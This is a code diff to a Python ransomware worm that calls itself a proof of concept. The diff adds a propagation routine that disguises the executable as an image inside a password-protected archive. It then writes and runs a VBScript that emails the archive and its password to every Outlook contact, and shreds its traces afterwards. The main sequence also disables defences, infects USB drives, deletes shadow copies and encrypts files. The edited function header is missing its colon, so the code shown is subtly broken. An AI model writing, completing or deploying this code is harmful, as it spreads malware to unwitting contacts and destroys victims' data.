@@ -710,11 +710,9 @@ def infect_usb():
             pass
 
 
-def send_email(zip_password="dcry-ransomware-poc"):
+def send_email(zip_password="dcry-ransomware-poc")
     worm_path = os.path.abspath(sys.executable)
     temp_dir = os.getenv("TEMP")
-
-    folder_name = f"IMG_4599"
 
     exe_name = "IMG_4599.jpg.exe"
     lnk_name = "IMG_4599.jpg.lnk"
@@ -729,12 +727,46 @@ def send_email(zip_password="dcry-ransomware-poc"):
     shortcut.TargetPath = exe_name
     shortcut.save()
 
-    zip_file_path = os.path.join(temp_dir, f"{folder_name}.7z")
+    zip_file_path = os.path.join(temp_dir, f"IMG_4599.7z")
     with py7zr.SevenZipFile(zip_file_path, mode='w', password=zip_password) as archive:
         archive.write(exe_full, arcname=exe_name)
         archive.write(lnk_full, arcname=lnk_name)
 
-    shutil.rmtree(working_dir, ignore_errors=True)
+    vbs_code = f"""
+dim x
+on error resume next
+Set ol=CreateObject("Outlook.Application")
+Set out=WScript.CreateObject("Outlook.Application")
+Set mapi = out.GetNameSpace("MAPI")
+Set a = mapi.AddressLists(1)
+Set ae=a.AddressEntries
+For x=1 To ae.Count
+    Set ci=ol.CreateItem(0)
+    Set Mail=ci
+    Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
+    Mail.Subject = "Hey, is that you?!"
+    Mail.Body = "Oh no... that has got to be embarrassing!!! Extraction password: {zip_password}"
+    Mail.Attachments.Add("{zip_file_path}")
+    Mail.send
+Next
+ol.Quit
+"""
+    vbs_file_path = os.path.join(temp_dir, "mail.vbs")
+    with open(vbs_file_path, "w") as f:
+        f.write(vbs_code)
+    os.system(f'start /b "" "{vbs_file_path}"')
+
+    files = [vbs_file_path, zip_file_path, exe_full, lnk_full]
+
+    for file in files:
+        try:
+            with open(file, "w") as f: f.write(os.urandom(os.path.getsize(file)))
+        except:
+            pass
+        try:
+            os.remove(file)
+        except:
+            pass
 
 
 dev_mode = True
@@ -754,11 +786,13 @@ if __name__ == "__main__":
         block_processes()
         disable_all()
         infect_usb()
+        send_email()
         delete_shadow_copy()
         start_encryption()
         change_wallpaper()
         shutdown()
     else:
         start_encryption()
+
 
 
